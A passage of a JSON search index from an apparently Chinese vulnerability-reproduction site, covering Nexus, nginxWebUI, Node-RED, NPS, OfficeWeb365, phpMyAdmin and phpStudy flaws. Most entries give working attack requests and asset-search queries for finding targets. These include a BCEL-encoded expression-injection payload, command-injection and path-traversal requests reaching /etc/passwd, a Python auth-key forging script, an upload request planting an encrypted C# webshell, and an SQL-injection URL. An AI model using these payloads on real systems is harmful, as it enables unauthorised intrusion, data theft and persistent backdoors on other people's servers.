","date":"0001-01-01","objectID":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/:1:0","tags":null,"title":"","uri":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/"},{"categories":null,"content":"漏洞影响 Nexus \u003c 3.21.1 ","date":"0001-01-01","objectID":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/:2:0","tags":null,"title":"","uri":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10199 ","date":"0001-01-01","objectID":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/:3:0","tags":null,"title":"","uri":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/"},{"categories":null,"content":"网络测绘 app=“Nexus-Repository-Manager” ","date":"0001-01-01","objectID":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/:4:0","tags":null,"title":"","uri":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/"},{"categories":null,"content":"漏洞复现 漏洞触发需要任意账户权限 登录任意用户后修改 NXSESSIONID，发送请求包 POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: Connection: keep-alive NX-ANTI-CSRF-TOKEN: 0.6153568974227819 Content-Length: 4789 X-Requested-With: XMLHttpRequest X-Nexus-UI: true Content-Type: application/json 404: \"id\" Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=66e8bf5f-0544-4d7d-b1d7-970ce5158aff { \"name\": \"internal\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true }, \"group\": { \"memberNames\": [\"${' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$F","date":"0001-01-01","objectID":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/:5:0","tags":null,"title":"","uri":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/"},{"categories":null,"content":"nginxWebUI cmdOver 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 nginxWebUI 后台存在命令执行漏洞，攻击者登录后台后可以执行任意命令获取服务器权限 ","date":"0001-01-01","objectID":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 nginxWebUI ","date":"0001-01-01","objectID":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"nginxwebui\" ","date":"0001-01-01","objectID":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证请求包 POST /adminPage/remote/cmdOver remoteId=local\u0026cmd=start|id\u0026interval=1 ","date":"0001-01-01","objectID":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/nginxwebui-cmdover-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"nginxWebUI runCmd 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 nginxWebUI runCmd 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取到服务器权限，执行任意命令 ","date":"0001-01-01","objectID":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 nginxWebUI ","date":"0001-01-01","objectID":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"nginxwebui\" ","date":"0001-01-01","objectID":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证请求包 /AdminPage/conf/runCmd?cmd=id ","date":"0001-01-01","objectID":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/nginxwebui-runcmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Node-RED ui_base 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Node-RED 在/nodes/ui_base.js中，URL与’/ui_base/js/*‘匹配，然后传递给path.join， 缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js ","date":"0001-01-01","objectID":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Node-RED ","date":"0001-01-01","objectID":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Node-RED\" ","date":"0001-01-01","objectID":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问页面 验证POC /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd /ui_base/js/..%2f..%2f..%2f..%2fsettings.js ","date":"0001-01-01","objectID":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/node-red-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"NPS auth_key 未授权访问漏洞 ","date":"0001-01-01","objectID":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 NPS auth_key 存在未授权访问漏洞，当 nps.conf 中的 auth_key 未配置时攻击者通过生成特定的请求包可以获取服务器后台权限 ","date":"0001-01-01","objectID":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 NPS ","date":"0001-01-01","objectID":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"serializeArray()\" \u0026\u0026 body=\"/login/verify\" ","date":"0001-01-01","objectID":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 在 web/controllers/base.go 文件中 md5Key := s.getEscapeString(\"auth_key\") timestamp := s.GetIntNoErr(\"timestamp\") configKey := beego.AppConfig.String(\"auth_key\") timeNowUnix := time.Now().Unix() if !(md5Key != \"\" \u0026\u0026 (math.Abs(float64(timeNowUnix-int64(timestamp))) \u003c= 20) \u0026\u0026 (crypt.Md5(configKey+strconv.Itoa(timestamp)) == md5Key)) { if s.GetSession(\"auth\") != true { s.Redirect(beego.AppConfig.String(\"web_base_url\")+\"/login/index\", 302) } } else { s.SetSession(\"isAdmin\", true) s.Data[\"isAdmin\"] = true } 这里需要的参数为 配置文件 nps.conf 中的 auth_key 与 timestamp 的md5 形式进行认证，但在默认的配置文件中，auth_key 默认被注释，所以只需要可以获取到的参数 timestamp 就可以登录目标 import time import hashlib now = time.time() m = hashlib.md5() m.update(str(int(now)).encode(\"utf8\")) auth_key = m.hexdigest() print(\"auth_key=%s\u0026timestamp=%s\" % (auth_key,int(now))) 验证POC POST /client/list search=\u0026order=asc\u0026offset=0\u0026limit=10\u0026auth_key=8c98b1bdedbc569c4e61eeaeb11ce772\u0026timestamp=1659838908 ","date":"0001-01-01","objectID":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/nps-auth_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"OfficeWeb365 SaveDraw 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 OfficeWeb365 SaveDraw 接口存在任意文件上传漏洞，攻击者通过漏洞可以在服务器中上传任意文件获取服务器权限 ","date":"0001-01-01","objectID":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 OfficeWeb365 ","date":"0001-01-01","objectID":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"OfficeWeb365\" ","date":"0001-01-01","objectID":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC POST /PW/SaveDraw?path=../../Content/img\u0026idx=6.ashx HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36 Content-Length: 990 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close data:image/png;base64,01s34567890123456789y12345678901234567m91\u003c%@ WebHandler Language=\"C#\" Class=\"Handler\" %\u003eusing System;using System.I0;using System.Reflection;using System.Text;using System.Web;using System.WebSessionState;using\u0026System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void=\u0026ProcessRequest(HttpContext context){try{string key=\"900bc885d7553375\";byteDk=\u0026Encoding.Default.GetBytes(key);context.Session.AddC\"sky\", key);StreamReader sr=new\u0026StreamReader(contextRequest.InputStream);string line=sr.ReadLine;if(!string.IsNullOrEmpty(line)){byteDc=\u0026Convert.FromBase64String(line);Assembly assembly=\u0026typeof(Environment).Assembly;RijndaelManaged rm=(RijndaelManaged)\u0026assembly.CreateInstance(\"System.Secur\"+\"ityCrypto\"+\"graphy.Rijnda\"+\"elm anaged\");byte[ data=rm.CreateDecryptorCk,k)TransformFinalBlock(c,0, c.Length);Assembly.Load(data)CreateInstance(\"U\").Equals(context);sr.clo se();}}catch {}}public bool IsReusable{get{return false;}}}}--- 上传地址 /Content/img/UserDraw/drawPW6.ashx ","date":"0001-01-01","objectID":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"OneBlog 小于v2.2.1 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 OneBlog 小于v2.2.1 由于使用含有漏洞版本的Apache Shiro和默认的密钥导致存在远程命令执行漏洞 ","date":"0001-01-01","objectID":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 OneBlog \u003c= v2.2.1 ","date":"0001-01-01","objectID":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"OneBlog开源博客后台管理系统\" ","date":"0001-01-01","objectID":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面如下 使用工具直接利用Apache Shiro漏洞即可 ","date":"0001-01-01","objectID":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/oneblog-%E5%B0%8F%E4%BA%8Ev2.2.1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"phpMyAdmin后台SQL注入 CVE-2020-26935 ","date":"0001-01-01","objectID":"/phpmyadmin%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5-cve-2020-26935/:0:0","tags":null,"title":"","uri":"/phpmyadmin%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5-cve-2020-26935/"},{"categories":null,"content":"漏洞描述 在4.9.6之前的phpMyAdmin和5.0.3之前的5.x的SearchController中发现一个问题。在phpMyAdmin如何处理搜索功能中的SQL语句中发现了一个SQL注入漏洞。攻击者可以利用此漏洞将恶意SQL注入查询。 参考链接： https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26935 https://xz.aliyun.com/t/8524 ","date":"0001-01-01","objectID":"/phpmyadmin%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5-cve-2020-26935/:1:0","tags":null,"title":"","uri":"/phpmyadmin%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5-cve-2020-26935/"},{"categories":null,"content":"漏洞复现 payload： http://127.0.0.1/tbl_zoom_select.php?db=pentest\u0026table=a\u0026get_data_row=1\u0026where_clause=updatexml(1,concat(0x7e,user()),1) ","date":"0001-01-01","objectID":"/phpmyadmin%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5-cve-2020-26935/:2:0","tags":null,"title":"","uri":"/phpmyadmin%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5-cve-2020-26935/"},{"categories":null,"content":"PHPStudy 后台管理页面 one click RCE ","date":"0001-01-01","objectID":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/:0:0","tags":null,"title":"","uri":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/"},{"categories":null,"content":"漏洞描述 phpStudy 集安全、高效、功能与一体，已获得全球用户认可安装，运维也高效。支持一键 LAMP、LNMP、集群、监控、网站、数据库、FTP、软件中心、伪静态、云备份、SSL、多版本共存、Nginx 反向代理、服务器防火墙、Web 防火墙、监控大屏等服务器管理功能。phpStudy 面板存在存储型 XSS 漏洞，攻击者可以通过 js 调用面板中的计划任务执行系统命令。 ","date":"0001-01-01","objectID":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/:1:0","tags":null,"title":"","uri":"/phpstudy-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2-one-click-rce/"},{"categories":null,"content":"影响版本 小皮 windows 面板 V0.102 以及以下版本 小皮 linux 面板 X1.29 以及以下版本 